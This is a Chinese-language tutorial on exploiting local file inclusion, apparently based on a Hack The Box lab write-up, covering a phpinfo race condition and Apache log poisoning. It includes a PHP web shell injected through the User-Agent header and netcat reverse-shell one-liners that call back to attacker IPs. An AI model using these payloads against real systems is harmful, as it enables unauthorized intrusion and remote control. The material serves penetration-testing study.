# LFI 漏洞的利用

---

[参考链接1](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5)

[参考链接2](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)

- LFI(本地文件包含漏洞)，这篇文章将介绍有关该漏洞的一些利用

###  1、phpinfo 漏洞信息利用

- 将LFI漏洞转变为远程代码执行（RCE）漏洞的竞争条件，服务器端需要满足以下条件：
    - LFI漏洞
    - 任何显示PHPInfo()配置输出的脚本
- [**脚本下载地址**](https://github.com/mxrmiss/Automation-script/blob/03406f1e18b9cbdcf832941b3bad224d99a0f55e/phpinfo.py)

- 得到脚本后，我们需要修改脚本中的攻击载荷, 使用命令 `locate php-reverse` 定位可用的php载荷位置

```
/usr/share/laudanum/php/php-reverse-shell.php
```

- 将载荷中的内容复制到脚本中, 替换图片中横线部分

![1](https://herozql.oss-cn-beijing.aliyuncs.com/p/o/1.png)

- 修改载荷中的IP地址和端口，然后将脚本的 LFIREQ 参数更改为我们在burpsuit中看到的参数。如：

```
LFIREQ="""GET /browse.php?file=%s
```

- 我们还必须将所有“=>”更改为“=>”，以便脚本正确编译。

- 然后使用nc接收反弹的shell
- 运行脚本 `python3 phpinfo.py xxxip xxxport` (受害者ip和端口)

### 2、日志中毒

- 原理
    - 日志中毒背后的想法是将一些 php 放入日志中，然后将它们加载到 php 将执行的位置。如果我们查看访问日志，我们会看到每次访问该站点时，都会有一个条目，其中包含所访问的 url 和浏览器访问的用户代理字符串。
    - 最简单的情况是更改我们的用户代理字符串，使其包含 php，然后将该日志文件包含在我们的 LFI 中。我们也可以毒化 url 字段，但访问类似`http://10.10.10.84/browse.php?not_an_arg=[php code]`. 只要我们能把我们的php写入日志，我们就成功了。

- 我们需要定位到日志文件的位置，这里以apache为例，通过google我们可以知道配置文件一般在 `/usr/local/etc/apache24/httpd.conf` 目录，查看配置文件，我们可以找到日志文件位置：

```
ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log"
```

- 打开burpsuit，获取日志文件页面页面并对其修改
- 由于用户代理(User-Agent)这一部分是由我们用户决定的，所以我们可以将这一部分换成我们的漏洞代码

```
<?php system($_GET['c']); ?>
```

- 通过修改参数c的值，我们可以在网页得到不同的结果

- 于是将反弹shell传值给c，第一次使用代码`nc -e /bin/bash 10.10.14.27 4444` ,结果只是连接上了靶机，但是未能反弹shell，这就说明了靶机的nc版本不支持-e 参数，于是使用nc的另一种反弹shell方式，代码：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

- 查看本地监听器，会发现有结果了